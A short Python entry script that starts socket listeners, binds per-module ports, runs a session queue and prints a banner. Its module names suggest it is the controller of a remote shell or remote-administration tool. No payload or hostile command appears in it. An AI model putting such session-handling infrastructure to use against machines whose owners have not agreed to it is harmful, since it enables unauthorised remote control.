import threading
import argparse

from domestic.utility.get_io_channels import *
from domestic.modules.socket_handler import *
from domestic.utility.status_message import *
from domestic.utility.text_to_ascii import *
from domestic.session.session_queue import *
from domestic.utility.write_error import *
from domestic.global_state import *
from domestic.shell.server import *


def program_setup():
  parser = argparse.ArgumentParser(description=state['description'])
  parser.add_argument('-ip', '--ipv4', default='localhost', help='IP of host.')
  parser.add_argument('-p', '--port', type=int, default=1200, help='Port of host.')
  args = parser.parse_args()

  try:
    get_io_channels()
    threading.Thread(target=listening, args=(args.ipv4, str(args.port), False), daemon=True).start()
    for index, module in enumerate([*state['sockets']['modules']]):
      bind_socket(args.ipv4, str(args.port + (index + 1)), module, False)
  except Exception as err:
    write_error(err)
    status_message('Socket binding error, please verify IP / port argument', 'danger', {'end': True})
    raise Exception('Argument parsing error')

  threading.Thread(target=session_queue, daemon=True).start()
  
  status_message(text_to_ascii(state['name']), 'pure', {'end': True})
  print()
  status_message(state['description'], 'pure', {'end': True})
  print()
  status_message(state['author'], 'pure', {'end': True})
  print()
  status_message(None, 'program')